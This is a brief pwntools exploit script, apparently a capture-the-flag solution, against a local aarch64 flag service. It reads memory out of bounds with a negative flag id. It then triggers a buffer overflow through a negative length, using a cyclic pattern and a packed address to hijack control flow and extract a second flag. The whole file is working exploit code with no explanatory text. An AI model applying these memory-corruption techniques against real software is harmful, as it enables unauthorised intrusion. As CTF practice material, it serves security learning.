from pwn import *

#s = process('./run.sh')
s = remote('127.0.0.1', 13336)
context.arch = 'aarch64'


def clr():
    s.recvuntil('What do you want to do?')

def get_flag(flag_id):
    s.send('g\n')
    s.recvuntil('Flag id: ')
    s.send('%d\n' % flag_id)
    s.recvuntil('Flag content: ')
    return s.recvline(keepends=False)

def put_flag(len, content):
    s.send('p\n')
    s.recvuntil('Flag length: ')
    s.send('%d\n' % len)
    s.recvuntil('Flag content: ')
    s.send(content + b'\n')



def main():
    log.info("Waiting to boot ...")
    clr()
    log.info("Done! Getting flag1:")
    flag1 = get_flag(-256)
    log.success(flag1)
    log.info("Getting flag2:")
    put_flag(-112, cyclic(0x80)+p64(0xdeadbeef)+p64(0x040011020))
    s.recvuntil("The flag is: ")
    flag2 = s.recvuntil("}")
    log.success(flag2)




if __name__ == '__main__':
    main()

